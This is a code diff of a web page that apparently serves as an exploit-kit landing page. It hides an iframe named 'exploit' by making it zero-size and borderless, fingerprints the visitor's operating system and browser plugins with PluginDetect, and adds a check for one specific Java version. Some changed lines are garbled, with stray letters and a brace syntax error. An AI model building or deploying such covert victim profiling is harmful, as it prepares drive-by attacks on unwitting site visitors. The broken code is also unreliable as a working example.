@@ -1,8 +1,12 @@
-<!DOCTYPE html> <html> <head> <script 
-src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> 
-</head> <body> <iframe id="exploit" src="http://www.google.com" 
-width="200" height="200"></iframe> <script> var BrowserScanHostDetails = 
-{};
+<!DOCTYPE html>
+<html>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+</head>
+<body>
+<iframe id="exploit" src="" width="0" height="0" frameborder="0" scrolling="no"></iframe>
+<script>
+var BrowserScanHostDetails = {};
 
 
 function CollectOS() {
@@ -351,7 +355,7 @@ var PluginDetect = {
                 c = this.$,
                 d = navigator,
                 b = c.isIE ? "" : d.userAgent || "",
-                f = d.vendor || "",
+c                f = d.vendor || "",
                 a = d.product || "";
             c.isGecko = (/Gecko/i).test(a) && (/Gecko\s*\/\s*\d/i).test(b);
             c.verGecko = c.isGecko ? c.formatNum((/rv\s*\:\s*([\.\,\d]+)/i).test(b) ? RegExp.$1 : "0.9") : null;
@@ -2104,7 +2108,7 @@ var PluginDetect = {
                     k = document,
                     i = null,
                     b = null,
-                    f = null,
+y                    f = null,
                     h = true,
                     a = [1, 0, 1, 1, 1],
                     r = [1, 0, 1, 1, 1],
@@ -2655,9 +2659,13 @@ function CollectParams(){
 
 	for (var i in ao){
 		if (BrowserScanHostDetails[ao[i]] != undefined){
-			//alert(BrowserScanHostDetails[ao[i]]);
 			params += plugins[ao[i]] + "=" + BrowserScanHostDetails[ao[i]] + "&";
-			//plugins
+			//alert(BrowserScanHostDetails[ao[i]]);
+			if(plugins[ao[i]]=='java'){
+				if(BrowserScanHostDetails[ao[i]]=='1,7,0,0'}{
+					alert(BrowserScanHostDetails[ao[i]]);
+				}
+			}			
 		}
 	}
 	$(document).ready(function(){
